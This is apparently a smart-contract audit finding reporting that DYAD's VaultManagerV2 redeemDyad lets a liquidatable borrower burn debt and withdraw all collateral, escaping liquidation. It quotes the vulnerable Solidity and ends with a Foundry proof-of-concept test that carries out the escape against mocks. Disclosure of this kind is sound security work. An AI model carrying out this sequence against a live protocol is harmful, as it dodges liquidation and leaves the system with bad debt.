# Vulnerability details

## Impact

Users can freely avoid liquidation due to a missing check if the user is for liquidation in the `redeemDyad` function. This way they can retrieve back all their collateral rather than part of it after being liquidated.

This will remove the incentive of building liquidation bots to remove underwater positions, potentially breaking the stability of the DYAD token. When there are no timely liquidations, the system accrues bad debt and the price of DYAD depreciates.

## Proof of Concept

[VaultManagerV2.sol#L184-L202](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L184-L202)

```solidity
function redeemDyad(
  uint    id,
  address vault,
  uint    amount,
  address to
)
  external 
    isDNftOwner(id)
  returns (uint) { 
    dyad.burn(id, msg.sender, amount);
    Vault _vault = Vault(vault);
    uint asset = amount 
                  * (10**(_vault.oracle().decimals() + _vault.asset().decimals())) 
                  / _vault.assetPrice() 
                  / 1e18;
    withdraw(id, vault, asset, to);
    emit RedeemDyad(id, vault, amount, to);
    return asset;
}
```

[VaultManagerV2.sol#L134-L153](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L134-L153)

```solidity
  function withdraw(
    uint    id,
    address vault,
    uint    amount,
    address to
  ) 
    public
      isDNftOwner(id)
  {
    if (idToBlockOfLastDeposit[id] == block.number) revert DepositedInSameBlock();
    uint dyadMinted = dyad.mintedDyad(address(this), id);
    Vault _vault = Vault(vault);
    uint value = amount * _vault.assetPrice() 
                  * 1e18 
                  / 10**_vault.oracle().decimals() 
                  / 10**_vault.asset().decimals();
    if (getNonKeroseneValue(id) - value < dyadMinted) revert NotEnoughExoCollat();
    _vault.withdraw(id, to, amount);
    if (collatRatio(id) < MIN_COLLATERIZATION_RATIO)  revert CrTooLow(); 
  }
```

Borrower can freely withdraw his collateral because `collateralRatio` check is the last point of the redeem flow, after that his `collateralRatio` will be `uint.max`, because his `DYAD` was already burned in `redeemDyad`, that way he can burn the all his `DYAD`, even if was at liquidation state and redeem all of his collateral. 

That opens scenarios users to stay at the limit of liquidation (~150%) and exit the system without taking a loss when price of their collateral decreases. 

[VaultManagerV2.sol#L230-L239](https://github.com/code-423n4/2024-04-dyad/blob/4a987e536576139793a1c04690336d06c93fca90/src/core/VaultManagerV2.sol#L230-L239)

```solidity
function collatRatio(
  uint id
)
  public 
  view
  returns (uint) {
    uint _dyad = dyad.mintedDyad(address(this), id);
    if (_dyad == 0) return type(uint).max;
    return getTotalUsdValue(id).divWadDown(_dyad);
}
```

### Coded PoC

Here is a Coded POC, which demonstrates user borrowing up to the limit and when there is a price update of the oracle and he become liquidatable, he can exit the system, receiving 100% of his collateral back.

In order to execute the test:

1. Add `virtual` to the setUp of `BaseTest` file.
2. Create new file and place the entire content there, then execute:

```solidity
forge test --match-test test_can_exit_even_if_cr_low -vv
```

```
// SPDX-License-Identifier: MIT
pragma solidity =0.8.17;

import "forge-std/console.sol";
import {BaseTest} from "./BaseTest.sol";
import {IVaultManager} from "../src/interfaces/IVaultManager.sol";
import {VaultManagerV2} from "../src/core/VaultManagerV2.sol";
import {Vault} from "../src/core/Vault.sol";
import {ERC20} from "@solmate/src/tokens/ERC20.sol";
import {IAggregatorV3} from "../src/interfaces/IAggregatorV3.sol";
import {ERC20Mock} from "./ERC20Mock.sol";

contract VaultManagerV2Test is BaseTest {
    VaultManagerV2 vaultManagerV2;

    function setUp() public override {
        super.setUp();

        vaultManagerV2 = new VaultManagerV2(dNft, dyad, vaultLicenser);

        wethVault = new Vault(vaultManagerV2, ERC20(address(weth)), IAggregatorV3(address(wethOracle)));

        vm.prank(vaultLicenser.owner());
        vaultLicenser.add(address(wethVault));

        vm.prank(vaultManagerLicenser.owner());
        vaultManagerLicenser.add(address(vaultManagerV2));
    }

    function mintDNFTAndDepositToWethVault(address user, uint256 amountAsset, uint256 amountDyad)
        public
        returns (uint256 nftId)
    {
        vm.deal(user, 2 ether);
        vm.startPrank(user);
        nftId = dNft.mintNft{value: 2 ether}(user);

        vaultManagerV2.add(nftId, address(wethVault));

        weth.mint(user, amountAsset);
        weth.approve(address(vaultManagerV2), amountAsset);

        vaultManagerV2.deposit(nftId, address(wethVault), amountAsset);
        vaultManagerV2.mintDyad(nftId, amountDyad, user);
        vm.stopPrank();
    }

    function test_can_exit_even_if_cr_low() public {
        address alice = makeAddr("Alice");

        uint256 aliceNft = mintDNFTAndDepositToWethVault(alice, 15e18, 10000e18); // 150% collateral ratio
        assertEq(vaultManagerV2.collatRatio(aliceNft), 1.5e18);

        wethOracle.setPrice(900e8);
        assertLt(vaultManagerV2.collatRatio(aliceNft), 1.5e18);

        vm.roll(block.number + 1);

        // Alice can redeem everything even she is liquidatable
        vm.startPrank(alice);
        console.log("Alice weth balance before:", weth.balanceOf(alice)); // 0
        vaultManagerV2.redeemDyad(
            aliceNft, address(wethVault), dyad.mintedDyad(address(vaultManagerV2), aliceNft), alice
        );
        console.log("Alice weth balance after redeem:", weth.balanceOf(alice)); // 11.11
        assertEq(vaultManagerV2.collatRatio(aliceNft), type(uint256).max);

        // Alice can withdraw the rest 3.88 tokens
        vaultManagerV2.withdraw(aliceNft, address(wethVault), 15e18 - weth.balanceOf(alice), alice);
        console.log("Alice weth balance after withdraw:", weth.balanceOf(alice)); // 15
    }
}
```

```solidity
Logs:
